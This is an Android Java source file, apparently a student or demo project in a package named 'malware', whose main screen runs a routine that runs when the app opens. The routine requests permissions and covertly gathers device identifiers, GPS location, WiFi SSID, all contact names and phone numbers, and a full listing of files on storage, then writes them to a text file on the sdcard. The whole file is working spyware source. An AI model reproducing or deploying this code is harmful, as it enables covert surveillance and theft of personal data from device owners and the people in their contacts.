package com.shlomi.malware;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class MainActivity extends AppCompatActivity {

    OutputStreamWriter outputStreamWriter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        malware();
    }

    private void malware() {
        String[] permissions_req = {
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE};

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            this.requestPermissions(permissions_req, 1);
        }

        File sdcard = Environment.getExternalStorageDirectory();
        File file = new File(sdcard.getAbsolutePath(),"information.txt");

        try {
            //outputStreamWriter = new OutputStreamWriter(this.openFileOutput("information.txt", Context.MODE_PRIVATE));
            outputStreamWriter = new OutputStreamWriter(new FileOutputStream(file));
            outputStreamWriter.write("Device model: " + Build.MODEL + "\n");
            outputStreamWriter.write("Product: " + Build.PRODUCT + "\n");
            outputStreamWriter.write("Device: " + Build.DEVICE + "\n");
            outputStreamWriter.write("OS version: " + System.getProperty("os.version") + "\n");
            outputStreamWriter.write("SDK version: " + Build.VERSION.SDK_INT + "\n");
            outputStreamWriter.write("Hardware: " + Build.HARDWARE + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Host: " + Build.HOST + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Serial: " + Build.SERIAL + "\n");
            outputStreamWriter.write("User: " + Build.USER + "\n");
            outputStreamWriter.write("Display: " + Build.DISPLAY + "\n");
            outputStreamWriter.write("Bootloader: " + Build.BOOTLOADER + "\n");
            outputStreamWriter.write("ID: " + Build.ID + "\n");
            outputStreamWriter.write("Radio version: " + Build.getRadioVersion() + "\n");

        } catch (IOException e) {
            e.printStackTrace();
        }


        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    Activity#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
            return;
        }
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        try {
            outputStreamWriter.write("Location: "+location+"\n");
        } catch (IOException e) {
            e.printStackTrace();
        }

        ConnectivityManager connManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            try {
                outputStreamWriter.write("Connected to wifi\n");
            } catch (IOException e) {
                e.printStackTrace();
            }

            WifiManager wifiManager = (WifiManager) this.getApplicationContext().getSystemService (Context.WIFI_SERVICE);
            WifiInfo info = wifiManager.getConnectionInfo ();
            String ssid  = info.getSSID();
            try {
                outputStreamWriter.write("SSID: " + ssid + "\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            try {
                outputStreamWriter.write("Not connected to wifi\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        try {
            writeContacts();
        } catch (IOException e) {
            e.printStackTrace();
        }

        write_tree(Environment.getExternalStorageDirectory());
        write_tree(new File("/sdcard/"));

        try {
            outputStreamWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }

    private void write_tree(File root) {
        if(root.isFile()) {
            try {
                outputStreamWriter.write("File: " + root.getAbsolutePath() + "\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            try {
                outputStreamWriter.write("Folder: " + root.getAbsolutePath() + "\n");
                File[] files = root.listFiles();
                if(files != null && files.length > 0) {
                    for(File f : root.listFiles()) {
                        write_tree(f);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }

    private void writeContacts() throws IOException {
        ContentResolver cr = this.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        outputStreamWriter.write("Contact name: " + name + " Phone: " + phoneNo+"\n");
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }


}
